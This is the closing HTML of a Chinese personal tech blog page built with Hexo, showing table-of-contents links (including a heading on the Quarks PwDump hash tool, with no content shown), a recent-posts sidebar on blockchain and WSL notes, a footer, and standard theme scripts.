href="#ubuntu18-04-docker%E9%85%8D%E7%BD%AE%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90"><span class="toc-number">14.1.</span> <span class="toc-text">ubuntu18.04 docker配置国内镜像源</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-02-08"><span class="toc-number">15.</span> <span class="toc-text">2022-02-08</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quarks-PwDump%E5%90%84%E7%A7%8D32%E4%BD%8D64%E7%B3%BB%E7%BB%9F%E8%8E%B7%E5%8F%96HASH"><span class="toc-number">15.1.</span> <span class="toc-text">Quarks PwDump各种32位64系统获取HASH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#USAGE"><span class="toc-number">15.1.1.</span> <span class="toc-text">USAGE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-02-05"><span class="toc-number">16.</span> <span class="toc-text">2022-02-05</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#VMware-Tools-ISO%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">16.1.</span> <span class="toc-text">VMware Tools ISO文件下载</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/bb1666b8.html" title="林建入_《区块链实验课》"><img src="/img/img/25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="林建入_《区块链实验课》"/></a><div class="content"><a class="title" href="/posts/bb1666b8.html" title="林建入_《区块链实验课》">林建入_《区块链实验课》</a><time datetime="2024-07-05T10:09:07.000Z" title="发表于 2024-07-05 18:09:07">2024-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c4046440.html" title="历史归档"><img src="/img/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="历史归档"/></a><div class="content"><a class="title" href="/posts/c4046440.html" title="历史归档">历史归档</a><time datetime="2024-07-05T08:04:17.000Z" title="发表于 2024-07-05 16:04:17">2024-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3f4ab5ae.html" title="李晓黎_《Go语言Hyperledger区块链开发实战》"><img src="/img/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="李晓黎_《Go语言Hyperledger区块链开发实战》"/></a><div class="content"><a class="title" href="/posts/3f4ab5ae.html" title="李晓黎_《Go语言Hyperledger区块链开发实战》">李晓黎_《Go语言Hyperledger区块链开发实战》</a><time datetime="2024-06-19T03:17:29.000Z" title="发表于 2024-06-19 11:17:29">2024-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8bae2eef.html" title="WSL导盘"><img src="/img/img/22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WSL导盘"/></a><div class="content"><a class="title" href="/posts/8bae2eef.html" title="WSL导盘">WSL导盘</a><time datetime="2024-05-25T14:13:59.000Z" title="发表于 2024-05-25 22:13:59">2024-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6bcdfa14.html" title="区块链学习笔记"><img src="/img/img/21.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="区块链学习笔记"/></a><div class="content"><a class="title" href="/posts/6bcdfa14.html" title="区块链学习笔记">区块链学习笔记</a><time datetime="2024-05-10T12:00:37.000Z" title="发表于 2024-05-10 20:00:37">2024-05-10</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By 水木时</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>